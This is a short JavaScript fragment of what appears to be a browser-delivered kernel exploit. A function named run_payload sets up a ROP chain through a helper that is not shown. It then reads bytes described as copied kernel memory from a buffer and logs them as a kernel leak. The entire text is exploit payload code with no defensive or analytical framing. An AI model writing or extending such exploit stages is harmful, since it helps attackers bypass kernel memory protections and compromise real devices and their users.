function run_payload() {
  debug_log(\"Running payload: copyout test...\");

  const rop = setupROP();

  setTimeout(() => {
    // JS buffer should contain copied kernel bytes at offset 0x300
    const leakOffset = 0x300 / 4;
    const leaked_lo = rop[leakOffset];
    const leaked_hi = rop[leakOffset + 1];

    debug_log(\"Leaked kernel bytes: 0x\" + leaked_hi.toString(16).padStart(8, '0') + leaked_lo.toString(16).padStart(8, '0'));
  }, 300);
}
